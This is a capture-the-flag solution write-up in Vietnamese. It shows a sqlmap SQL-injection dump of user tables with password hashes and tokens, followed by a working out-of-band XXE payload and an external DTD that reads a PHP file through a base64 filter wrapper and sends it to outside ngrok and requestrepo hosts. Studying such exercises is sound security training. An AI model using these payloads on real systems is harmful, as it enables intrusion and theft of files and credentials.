# Solution

sqli ở `/data.php?u=` dùng sqlmap ta dump được các thông tin sau

```
Database: typodb
[3 tables]
+------------------------------------------------------+
| secretkeys                                           |
| tokens                                               |
| users  


Table: tokens
[2 entries]
+-----+----------------------------------+
| uid | token                            |
+-----+----------------------------------+
| 3   | 2f6ece875e1917a7cbe088ba6809a2a1 |
| 1   | a51149a51a42a14e9682a9a8a514caf6 |
+-----+----------------------------------+


Table: users
[3 entries]
+----+-------------------------+----------------------------------+-------------+
| id | email                   | password                         | username    |
+----+-------------------------+----------------------------------+-------------+
| 1  | admin@admin.com         | 924d06a2411d0d142b5d543896eb228e | admin       |
| 2  | test@test.com           | 098f6bcd4621d373cade4e832627b4f6 | test        |
| 3  | CTFCreators@twitter.com | d6ab9e3e0af68d85bef320ebd22bcb05 | CTFCreators |
+----+-------------------------+----------------------------------+-------------+


Table: secretkeys
[1 entry]
+--------------------------------------+
| uuidkey                              |
+--------------------------------------+
| 8d6ed261-f84f-4eda-b2d2-16332bd8c390 |
+--------------------------------------+
```

crack password của admin -> `thaii`

XXE exiftrate content của `/var/www/flag` với UUID trong table `secretkeys`


gửi POST request tới `/read.php`

```
data=<!DOCTYPE foo [<!ENTITY %25 xxe SYSTEM
"http://382d-2402-800-63b7-e478-414b-1fe3-36ae-91c.ngrok.io/exp.dtd"> %25xxe;]>
```

ở server ta tạo một file `exp.dtd` với nội dung:

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/read.php">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://b9kli0dp.requestrepo.com/?x=%file;'>">
%eval;
%exfiltrate;
```


Lưu ý ở đây nếu k sử dụng php wrapper thì sẽ không bypass được access control.